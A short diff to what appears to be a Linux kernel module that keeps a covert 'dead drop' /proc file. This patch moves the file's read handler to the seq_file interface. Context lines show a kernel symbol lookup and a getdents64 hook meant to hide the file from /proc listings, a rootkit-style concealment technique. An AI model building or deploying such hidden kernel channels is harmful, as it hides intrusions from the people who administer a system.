@@ -9,6 +9,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
@@ -35,13 +36,17 @@ static unsigned long kaddr(const char *name)
 
 // --- proc read/write for the dead drop ---
 
-static ssize_t drop_read(struct file *f, char __user *buf,
-			   size_t count, loff_t *pos)
+static int drop_show(struct seq_file *m, void *v)
 {
 	if (!visible)
 		return -EACCES;
-	return simple_read_from_buffer(buf, count, pos,
-				       drop_msg, strlen(drop_msg));
+	seq_printf(m, "%s", drop_msg);
+	return 0;
+}
+
+static int drop_open(struct inode *inode, struct file *file)
+{
+	return single_open(file, drop_show, NULL);
 }
 
 static ssize_t drop_write(struct file *f, const char __user *buf,
@@ -61,8 +66,11 @@ static ssize_t drop_write(struct file *f, const char __user *buf,
 }
 
 static const struct proc_ops drop_proc_ops = {
-	.proc_read  = drop_read,
-	.proc_write = drop_write,
+	.proc_open    = drop_open,
+	.proc_read    = seq_read,
+	.proc_lseek   = seq_lseek,
+	.proc_release = single_release,
+	.proc_write   = drop_write,
 };
 
 // --- getdents64 hook: hide .drop from /proc listings ---
